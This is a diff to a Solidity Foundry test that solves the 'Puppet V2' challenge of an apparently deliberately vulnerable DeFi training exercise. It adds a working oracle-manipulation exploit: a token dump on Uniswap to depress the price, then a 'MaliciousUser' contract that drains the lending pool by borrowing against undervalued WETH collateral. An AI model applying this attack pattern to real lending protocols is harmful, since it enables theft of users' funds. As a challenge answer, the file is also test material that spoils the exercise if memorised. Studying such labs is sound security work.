@@ -15,10 +15,10 @@ contract PuppetV2Challenge is Test {
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
 
-    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
-    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18; 
+    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;   
     uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
-    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18; 
     uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
 
     WETH weth;
@@ -98,7 +98,33 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        MaliciousUser attacker = new MaliciousUser(
+            uniswapV2Router,
+            lendingPool,
+            token,
+            weth
+        );
+
+        uint256 amountIn = token.balanceOf(player);
         
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), amountIn);
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens({
+            amountIn: amountIn,
+            amountOutMin: 0,
+            path: path,
+            to: player,
+            deadline: block.timestamp
+        });
+
+        uint256 totalPlayerBalance = player.balance;
+        weth.deposit{value: totalPlayerBalance}();
+        weth.transfer(address(attacker), totalPlayerBalance);
+
+        attacker.attack(recovery);
     }
 
     /**
@@ -107,5 +133,32 @@ contract PuppetV2Challenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+
+contract MaliciousUser {
+    IUniswapV2Router02 uniswapV2Router;
+    PuppetV2Pool lendingPool;
+    DamnValuableToken token;
+    WETH weth;
+
+    constructor(
+        IUniswapV2Router02 _uniswapV2Router,
+        PuppetV2Pool _lendingPool,
+        DamnValuableToken _token,
+        WETH _weth
+        ) {
+        uniswapV2Router = _uniswapV2Router;
+        lendingPool = _lendingPool;
+        token = _token;
+        weth = _weth;
+    }
+
+    function attack(address _recovery) public {
+        uint256 targetBalance = token.balanceOf(address(lendingPool));
+        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
+        lendingPool.borrow(targetBalance);
+        token.transfer(_recovery, token.balanceOf(address(this)));
     }
 }
